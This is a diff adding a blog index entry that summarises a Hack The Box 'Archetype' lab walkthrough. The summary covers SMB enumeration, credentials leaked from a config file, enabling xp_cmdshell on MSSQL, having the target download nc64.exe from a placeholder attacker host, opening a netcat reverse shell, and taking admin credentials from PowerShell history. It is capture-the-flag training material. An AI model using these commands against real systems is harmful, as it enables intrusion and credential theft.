@@ -98,6 +98,25 @@
     </nav>
 </header>
 <main class="main"> 
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Archetype HTB Walkthrough
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>1. Initial Recon Nmap Scan nmap -sCV -p- --open 10.129.95.187 -oN nmap_scan Findings: Port 445 (SMB) - Potential file shares
+Port 1433 (MSSQL) - Microsoft SQL Server
+2. SMB Enumeration List Shares smbclient -L -N //10.129.95.187 Found share: backups
+Access Share smbclient \\\\10.129.95.187\\backups -N Downloaded prod.dtsConfig containing credentials:
+User: ARCHETYPE\sql_svc
+Password: M3g4c0rp123
+3. MSSQL Exploitation Setup Impacket python -m venv impacket_venv source impacket_venv/bin/activate pip install . Connect to MSSQL python examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth Enable xp_cmdshell EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; 4. Reverse Shell Setup Listener nc -lvnp 443 Transfer nc.exe xp_cmdshell &#34;powershell -c wget http://YOUR_IP/nc64.exe -outfile C:\Users\sql_svc\Downloads\nc64.exe&#34; Execute Shell xp_cmdshell &#34;C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe YOUR_IP 443&#34; 5. Privilege Escalation Found Credentials type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt Found admin credentials: administrator:MEGACORP_4dm1n!!
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-07-06 18:04:05 +0300 MSK'>July 6, 2025</span></footer>
+  <a class="entry-link" aria-label="post link to Archetype HTB Walkthrough" href="https://hoverdd.github.io/htb-notes/posts/archetype/"></a>
+</article>
     </main>
     
 <footer class="footer">
